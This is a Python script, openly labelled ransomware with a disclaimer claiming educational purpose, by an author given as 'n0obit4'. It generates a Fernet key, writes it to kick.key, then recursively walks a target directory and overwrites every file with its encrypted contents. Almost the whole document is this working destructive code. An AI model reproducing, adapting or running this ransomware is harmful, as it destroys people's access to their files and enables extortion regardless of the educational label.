from cryptography.fernet import Fernet
import os,glob
#This Ransomware be used to EDUCATIONAL PURPOSE only

__author__  = 'n0obit4'
__date__    = '29/09/2020'
__version__ = 'v1.0'

class Ransomware:

	def generate_key(self):
		'''
		Let's create encryption key and save in file kick.key
		'''
		key = Fernet.generate_key()
		with open("kick.key", "wb") as keyf:
			keyf.write(key)

	def load_key(self):
		'''
		Load encryption key
		'''
		return open('kick.key', 'rb').read()

	def crypt_file(self, key, dir):
		'''
		Encrypt files with a key
		'''
		#Go through all directories
		for x in os.walk(dir):
			for item in glob.glob(os.path.join(x[0], '*')):
				#Load is file only
				if os.path.isfile(item):
					#Import key
					clave = Fernet(key)
					#Open file to encrypt
					file = open(item, "rb")
					#Encrypting file
					encrypted = clave.encrypt(file.read())
					#Writting into file
					to = open(item, 'wb')
					to.write(encrypted)

if __name__ == '__main__':
	rw = Ransomware()
	rw.generate_key()
	rw.crypt_file(rw.load_key(), 'Directory_to/encrypt')
